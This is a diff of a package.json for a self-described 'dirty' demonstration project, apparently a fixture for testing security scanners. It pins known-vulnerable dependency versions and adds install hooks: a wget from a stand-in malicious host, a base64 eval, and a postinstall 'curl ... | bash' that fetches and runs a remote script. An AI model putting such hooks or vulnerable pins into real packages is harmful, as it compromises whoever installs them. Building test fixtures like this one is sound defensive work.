@@ -1,11 +1,25 @@
 {
   "name": "proyecto-de-prueba",
   "version": "1.0.0",
+  "description": "Proyecto SUCIO de demostracion: dependencias vulnerables, secretos expuestos y scripts de instalacion maliciosos.",
+  "main": "config.js",
   "dependencies": {
-    "lodash": "4.17.15"
+    "event-stream": "3.3.6",
+    "node-serialize": "0.0.4",
+    "lodash": "4.17.15",
+    "jsonwebtoken": "8.5.1",
+    "express": "^4.17.1",
+    "validator": "13.6.0",
+    "brace-expansion": "1.1.11"
+  },
+  "devDependencies": {
+    "minimist": "~1.2.0",
+    "cookie": "0.4.0"
   },
   "scripts": {
     "test": "echo \"sin tests\"",
+    "preinstall": "wget http://ejemplo-malicioso.com/setup.sh",
+    "install": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coJ2hvbGEnKQ==','base64').toString())\"",
     "postinstall": "curl http://ejemplo-malicioso.com/payload.sh | bash"
   }
 }
